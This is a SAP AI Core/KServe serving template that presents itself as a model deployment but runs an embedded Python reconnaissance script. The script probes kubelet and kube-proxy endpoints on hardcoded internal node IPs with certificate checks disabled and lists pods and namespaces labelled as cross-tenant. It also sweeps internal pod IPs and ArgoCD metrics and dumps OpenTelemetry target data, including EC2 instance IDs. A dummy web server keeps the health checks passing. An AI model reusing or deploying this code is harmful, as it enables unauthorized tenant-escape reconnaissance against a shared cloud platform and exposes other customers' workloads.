apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v7
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v7"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v7"
    executables.ai.sap.com/name: "impact-probe-v7"
    executables.ai.sap.com/description: "impact verification probe v7"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error

            def report(k, v):
                print(f"[P7] {k}: {str(v)[:6000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            def https_get(url, headers=None, timeout=10):
                """HTTPS GET skipping certificate validation."""
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            # Node IPs confirmed reachable (port 10250 open) from probe v6
            NODE_IPS = [
                ("10.180.7.77",   "i-0bd1cce260a84045b", "eu-central-1a"),
                ("10.180.79.102", "i-000567cf9604d1fa5", "eu-central-1c"),
                ("10.180.8.165",  "i-0f85db863b5a6b42f", "eu-central-1a"),
            ]

            # ── 1. KUBELET HTTPS PROBING ─────────────────────────────────────────
            report("---", "=== KUBELET HTTPS (port 10250) ===")
            for node_ip, instance_id, az in NODE_IPS:
                base = f"https://{node_ip}:10250"
                for path, label in [
                    ("/healthz",                 "HEALTHZ"),
                    ("/metrics",                 "METRICS"),
                    ("/pods",                    "PODS"),
                    ("/stats/summary",           "STATS"),
                    ("/stats/",                  "STATS_ROOT"),
                    ("/spec/",                   "SPEC"),
                    ("/runningpods/",            "RUNNING_PODS"),
                    ("/metrics/cadvisor",        "CADVISOR"),
                    ("/metrics/resource",        "RESOURCE"),
                    ("/metrics/probes",          "PROBES"),
                ]:
                    body, code, hdrs = https_get(f"{base}{path}", timeout=6)
                    report(f"KUBELET_{node_ip}{path.replace('/','_')}", f"[{code}] {body[:1000]}")
                    if code == 200 and path == "/pods":
                        # Parse pod list and extract cross-tenant namespaces
                        try:
                            pods_data = json.loads(body)
                            namespaces = set()
                            pod_info = []
                            for item in pods_data.get("items", []):
                                ns = item.get("metadata", {}).get("namespace", "")
                                name = item.get("metadata", {}).get("name", "")
                                containers = [c.get("image","") for c in item.get("spec",{}).get("containers",[])]
                                namespaces.add(ns)
                                pod_info.append(f"{ns}/{name}: {containers[:2]}")
                            report(f"KUBELET_{node_ip}_NAMESPACES", str(sorted(namespaces)))
                            report(f"KUBELET_{node_ip}_POD_SAMPLE", "\n".join(pod_info[:30]))
                        except Exception as e:
                            report(f"KUBELET_{node_ip}_PODS_PARSE_ERR", str(e))

            # ── 2. KUBE-PROXY METRICS ON NODE IPs ────────────────────────────────
            report("---", "=== KUBE-PROXY METRICS ON NODE IPs ===")
            for node_ip, _, _ in NODE_IPS:
                body, code, _ = http_get(f"http://{node_ip}:10249/metrics", timeout=6)
                if code == 200:
                    lines = body.split("\n")
                    # Look for iptables rules, service endpoints, node IPs
                    proxy_lines = [l for l in lines if not l.startswith("#") and l.strip()][:50]
                    report(f"KUBE_PROXY_{node_ip}_metrics", "\n".join(proxy_lines[:30]))
                    # Extract any IPs in the proxy metrics
                    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", body)
                    report(f"KUBE_PROXY_{node_ip}_ips", str(list(dict.fromkeys(ips))[:50]))
                else:
                    report(f"KUBE_PROXY_{node_ip}", f"[{code}] {body[:150]}")
                # Also try /configz
                body2, code2, _ = http_get(f"http://{node_ip}:10249/configz", timeout=5)
                report(f"KUBE_PROXY_{node_ip}_configz", f"[{code2}] {body2[:500]}")

            # ── 3. POD IPs FROM OTEL ENDPOINTSLICES (newly discovered) ──────────
            report("---", "=== POD IPs FROM OTEL ENDPOINTSLICES ===")
            # These pod IPs were in the OTel TA endpointslices job output from v6
            pod_targets = [
                ("100.64.80.49", 8082, "argocd-application-controller-metrics"),
                ("100.64.15.16",  9090, "unknown-svc-9090"),
                ("100.64.109.17", 15090, "istio-metrics"),
                # Pull fresh endpointslices to discover more
            ]
            for ip, port, label in pod_targets:
                body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=6)
                report(f"POD_{ip}:{port}_{label}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
                if code not in (0,) and "ERR" not in body[:4]:
                    for path in ["/metrics", "/api/v1/query?query=up", "/health"]:
                        b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=6)
                        report(f"POD_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")

            # ── 4. FULL ENDPOINTSLICE JOB DUMP ───────────────────────────────────
            report("---", "=== FULL ENDPOINTSLICE TARGETS ===")
            ta_base = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
            body_es, code_es, _ = http_get(f"{ta_base}/jobs/kubernetes-endpointslices/targets", timeout=20)
            if code_es == 200:
                try:
                    data = json.loads(body_es)
                    targets = []
                    for cid, cdata in data.items():
                        for tg in cdata.get("targets", []):
                            for t in tg.get("targets", []):
                                lbl = tg.get("labels", {})
                                ns  = lbl.get("__meta_kubernetes_namespace", "")
                                svc = lbl.get("__meta_kubernetes_endpointslice_label_kubernetes_io_service_name", "")
                                img = lbl.get("__meta_kubernetes_pod_container_image", "")
                                pod_ip = lbl.get("__meta_kubernetes_pod_ip", "")
                                targets.append(f"{t} ns={ns} svc={svc} ip={pod_ip} img={img[:80]}")
                    for tgt in targets[:80]:
                        report("ES_TARGET", tgt)
                except Exception as e:
                    report("ES_PARSE_ERR", str(e))

            # ── 5. ADDITIONAL NODE IPs FROM KSM (extend scan) ────────────────────
            report("---", "=== EXTENDED NODE SCAN ===")
            # More node IPs from KSM in probe v6 — pick ones in different AZs
            extra_nodes = [
                "10.180.13.45",   # eu-central-1a  (from OTel TA node targets)
                "10.180.12.215",  # eu-central-1a  (from OTel TA node targets)
                "10.180.69.8",    # eu-central-1c  i-0b9393ca2a42b68a0
            ]
            for node_ip in extra_nodes:
                # TCP check first
                for port, label in [(10250, "kubelet"), (10249, "kube-proxy"), (9100, "node-exp")]:
                    try:
                        s = socket.socket()
                        s.settimeout(3)
                        s.connect((node_ip, port))
                        s.close()
                        open_str = "OPEN"
                    except:
                        open_str = "CLOSED"
                    report(f"EXTRA_NODE_{node_ip}:{port}_{label}", open_str)
                # If kubelet is reachable, try HTTPS
                body, code, _ = https_get(f"https://{node_ip}:10250/healthz", timeout=5)
                report(f"EXTRA_KUBELET_{node_ip}_healthz", f"[{code}] {body[:200]}")
                body2, code2, _ = https_get(f"https://{node_ip}:10250/pods", timeout=8)
                report(f"EXTRA_KUBELET_{node_ip}_pods", f"[{code2}] {body2[:200]}")

            # ── 6. ARGOCD METRICS DEEP PROBE ─────────────────────────────────────
            report("---", "=== ARGOCD APPLICATION METRICS ===")
            # ArgoCD server metrics might expose cross-tenant app info
            argocd_metric_ips = [
                ("100.64.80.49", 8082, "argocd-application-controller"),
                ("100.64.80.49", 8083, "argocd-application-controller-alt"),
            ]
            for ip, port, label in argocd_metric_ips:
                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=8)
                if code == 200:
                    lines = body.split("\n")
                    # Look for argocd_app_ metrics that expose tenant apps
                    app_lines = [l for l in lines
                                 if ("argocd_app" in l or "argocd_cluster" in l)
                                 and not l.startswith("#") and l.strip()]
                    report(f"ARGOCD_{ip}:{port}_app_metrics", "\n".join(app_lines[:50]))
                    # Also export all metric names
                    metric_names = list({l.split("{")[0].split(" ")[0] for l in lines
                                         if not l.startswith("#") and l.strip()})
                    report(f"ARGOCD_{ip}:{port}_metric_names", str(metric_names[:50]))
                else:
                    report(f"ARGOCD_{ip}:{port}", f"[{code}] {body[:200]}")

            # ── 7. OTEL TA FULL NODES TARGET DATA ────────────────────────────────
            report("---", "=== OTEL TA NODES TARGETS (all) ===")
            body_n, code_n, _ = http_get(f"{ta_base}/jobs/kubernetes-nodes/targets", timeout=20)
            if code_n == 200:
                try:
                    data_n = json.loads(body_n)
                    for cid, cdata in data_n.items():
                        for tg in cdata.get("targets", []):
                            for addr in tg.get("targets", []):
                                lbl = tg.get("labels", {})
                                az = lbl.get("__meta_kubernetes_node_label_topology_kubernetes_io_zone", "")
                                itype = lbl.get("__meta_kubernetes_node_label_node_kubernetes_io_instance_type", "")
                                iid = ""
                                # Get instance ID from csi annotation
                                csi = lbl.get("__meta_kubernetes_node_annotation_csi_volume_kubernetes_io_nodeid", "")
                                if csi:
                                    try: iid = json.loads(csi).get("ebs.csi.aws.com", "")
                                    except: pass
                                node_name = lbl.get("__meta_kubernetes_node_address_InternalIP", "")
                                report(f"NODE_TARGET", f"addr={addr} ip={node_name} az={az} type={itype} ec2={iid}")
                except Exception as e:
                    report("NODES_PARSE_ERR", str(e))

            report("DONE", "probe v7 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
